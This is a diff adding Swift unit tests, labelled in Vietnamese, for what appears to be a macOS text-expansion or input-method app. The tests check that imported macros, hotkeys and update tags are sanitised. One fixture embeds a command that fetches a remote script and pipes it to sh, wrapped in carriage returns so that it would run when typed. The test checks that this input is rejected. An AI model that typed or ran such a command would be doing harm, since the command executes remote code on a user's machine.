@@ -259,6 +259,34 @@ expect(MacroExpander.expand("kho", table: macros), nil, "kho")
 expect(MacroExpander.expand("", table: macros), nil, "rỗng")
 expect(String(MacroExpander.expand("ngay", table: macros, now: noon)!.prefix(10)), "hôm nay 14", "{date}")
 expect(macros.count == 3 ? "3" : "\(macros.count)", "3", "bỏ mục rỗng, có khoảng trắng")
+// Gõ tắt từ file nhập hay UserDefaults không được gõ ra ký tự điều khiển (TM-9)
+let unsafe = MacroExpander.table([
+    Macro(abbreviation: "ls", text: "ls\rcurl -s https://x/a|sh\r"), Macro(abbreviation: "nl", text: "a\nb"),
+    Macro(abbreviation: "esc", text: "a\u{1B}[A"), Macro(abbreviation: "tab", text: "a\tb"),
+    Macro(abbreviation: "ls2", text: "a\u{2028}b"), Macro(abbreviation: "c\u{7F}", text: "x"),
+    Macro(abbreviation: "dai", text: String(repeating: "a", count: Macro.maxTextLength + 1)),
+    Macro(abbreviation: String(repeating: "k", count: Macro.maxAbbreviationLength + 1), text: "x"),
+    Macro(abbreviation: "vn", text: "Việt Nam 🇻🇳 — “ngoặc”"),
+    Macro(abbreviation: "du", text: String(repeating: "a", count: Macro.maxTextLength)),
+])
+expect(unsafe.keys.sorted().joined(separator: ","), "du,vn", "loại ký tự điều khiển, quá dài")
+expect(MacroExpander.expand("ls", table: unsafe), nil, "\\r không bung")
+let zalgo = String(repeating: "a" + String(repeating: "\u{301}", count: 50), count: 100)
+expect(Macro(abbreviation: "z", text: zalgo).isAllowed ? "ok" : "sai", "sai", "đếm độ dài theo scalar")
+let many = MacroExpander.table((0...Macro.maxCount).map { Macro(abbreviation: "m\($0)", text: "x") })
+expect("\(many.count)", "\(Macro.maxCount)", "tối đa số mục")
+// Cập nhật chỉ khi bản tải về đúng tag và mới hơn (TM-11)
+// Phím tắt từ file nhập hay UserDefaults (TM-10)
+expect(HotkeySpec(keyCode: 36, modifiers: 0).sanitized == nil ? "nil" : "có", "nil", "Return trơn bị từ chối")
+var rawBits = HotkeySpec(keyCode: 6, modifiers: HotkeySpec.option, keyLabel: "Z"); rawBits.modifiers = HotkeySpec.option | 0xFF
+expect(rawBits.sanitized?.modifiers == HotkeySpec.option ? "ok" : "sai", "ok", "lọc bit lạ")
+var rawLabel = HotkeySpec(keyCode: 6, modifiers: HotkeySpec.option, keyLabel: "Z"); rawLabel.keyLabel = "Z\nTự kiểm tra bản mới: bật" + String(repeating: "x", count: 40)
+expect(rawLabel.sanitized?.keyLabel, "ZTự kiểm tra bản", "nhãn bỏ xuống dòng, tối đa 16")
+expect(AppVersion.isUpgrade(bundle: "1.2.1", tag: "v1.2.1", running: "1.2.0") ? "ok" : "sai", "ok", "nâng cấp")
+expect(AppVersion.isUpgrade(bundle: "1.1.1", tag: "v9.0.0", running: "1.2.0") ? "ok" : "sai", "sai", "zip bản cũ, tag giả")
+expect(AppVersion.isUpgrade(bundle: "1.1.1", tag: "v1.1.1", running: "1.2.0") ? "ok" : "sai", "sai", "hạ cấp")
+expect(AppVersion.isUpgrade(bundle: "1.2.0", tag: "v1.2.0", running: "1.2.0") ? "ok" : "sai", "sai", "bằng nhau")
+expect(AppVersion.isUpgrade(bundle: "", tag: "v1.2.1", running: "1.2.0") ? "ok" : "sai", "sai", "thiếu phiên bản")
 // Viết hoa đầu câu
 func caps(_ s: String) -> String {
     var c = SentenceCapitalizer()
